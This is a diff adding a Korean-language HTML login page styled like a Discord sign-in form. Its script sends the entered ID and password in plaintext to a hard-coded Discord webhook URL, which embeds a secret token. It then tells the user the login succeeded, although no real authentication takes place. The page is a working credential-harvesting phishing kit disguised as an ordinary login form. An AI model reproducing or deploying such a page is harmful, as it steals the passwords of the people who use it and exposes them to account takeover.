@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body {
+      background: #111;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial;
+      color: white;
+    }
+
+    .box {
+      background: #1e1e1e;
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+    }
+
+    button {
+      background: #5865F2;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>로그인</h2>
+  <input id="id" placeholder="아이디">
+  <input id="pw" type="password" placeholder="비밀번호">
+  <button onclick="login()">로그인</button>
+  <p id="result"></p>
+</div>
+
+<script>
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1462758530867265591/MaQo0lAdsm7ai9PyWm-xV3XVImaU25BZIffI6oBO3uCXPIw0OhlGMT2q0hSsKDwyyu89";
+
+  function login() {
+    const id = document.getElementById("id").value;
+    const pw = document.getElementById("pw").value;
+
+    if (!id || !pw) {
+      document.getElementById("result").innerText = "정보를 입력하세요";
+      return;
+    }
+
+    // 🔔 디스코드로 보낼 메시지
+    const data = {
+      content: "🔔 **로그인 발생**",
+      embeds: [{
+        title: "로그인 정보",
+        color: 5793266,
+        fields: [
+          { name: "아이디", value: id, inline: true },
+          { name: "비밀번호", value: pw, inline: true }
+        ],
+        footer: { text: "Login System" },
+        timestamp: new Date()
+      }]
+    };
+
+    fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+
+    document.getElementById("result").innerText = "로그인 완료";
+  }
+</script>
+
+</body>
+</html>
